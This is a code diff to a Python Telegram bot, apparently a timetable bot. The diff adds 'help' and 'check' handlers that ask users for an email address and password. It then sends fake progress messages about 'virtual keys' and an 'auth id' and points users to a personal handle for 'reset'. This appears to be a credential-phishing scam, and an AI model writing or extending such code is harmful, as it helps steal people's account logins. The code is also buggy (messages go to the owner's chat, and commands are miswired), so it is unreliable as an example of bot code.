@@ -57,11 +57,39 @@ def start(update, context):
 
 @run_async
 def help(update, context):
-    context.bot.send_message(chat_id=userId, text="""
-/accnt <userID> <password>  
-you dont have premium pack to use count mode
-""")
+    userId = Config.USERID
+    user_id = update.effective_user.id
+    if user_id != int(userId):
+     context.bot.send_message(chat_id=userId, text="""
+       /accnt 
+       <email> 
+       <password>  
+       example :
+       must @gmail
+       testverison@gamil.com
+       12345678@s
+       issue means dm to chck and send ss
+       """)
+     time.sleep(60)
+     context.bot.send_message(chat_id=userId, text="""
+           ok now your email get progress if you dont summited your email and passwrd recovery properly dm @alpha_romeo_06 to reset it bot
+           use check cmd by click /check
+           """)
 
+@run_async
+def check(update, context):
+    userId = Config.USERID
+    user_id = update.effective_user.id
+    if user_id != int(userId):
+       context.bot.send_message(chat_id=userId, text="""
+     send me your account detail
+     """)
+       time.sleep(15)
+       context.bot.send_message(chat_id=userId, text="""
+           your virtuval keys and code in paskey wait for 24 hrs
+           """)
+       time.sleep(30)
+       context.bot.send_message(chat_id=userId, text="your process started and your auth id {0}".format(user_id))
 
 def main():
     j = updater.job_queue
@@ -75,7 +103,7 @@ def main():
         dp.add_handler(CommandHandler("timetable", timeTable))
 
     dp.add_handler(CommandHandler("exit", exit))
-    dp.add_handler(CommandHandler("status", status))
+    dp.add_handler(CommandHandler("check", status))
     dp.add_handler(CommandHandler("help", help))
     dp.add_handler(CommandHandler("start", start))
     logging.info("Bot started")
